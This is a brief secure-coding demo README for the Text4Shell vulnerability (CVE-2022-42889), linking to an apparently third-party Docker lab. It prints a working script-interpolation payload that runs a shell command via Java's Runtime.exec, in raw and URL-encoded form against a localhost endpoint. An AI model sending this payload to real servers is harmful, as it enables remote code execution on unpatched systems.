# SecureCodingDemo
CVE-2022-42889
National Vulnerability Database link : https://nvd.nist.gov/vuln/detail/CVE-2022-42889#vulnCurrentDescriptionTitle

The program I used was written by karthikuj on github. I will link here the repository that contains the code as well as instructions on how you can perform this exploit on the sample program.

Github: https://github.com/karthikuj/cve-2022-42889-text4shell-docker


I learned of this vulnerability from this youtube video i stumbled upon, the exploit they perform is slightly different than the one i demonstrated.

youtube link: https://www.youtube.com/watch?v=UL6dWqSOdkQ


The code passed through the URL to the Program(append to search):

${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}


NOTE: URL Encode may be necessary

Encoded:  http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D



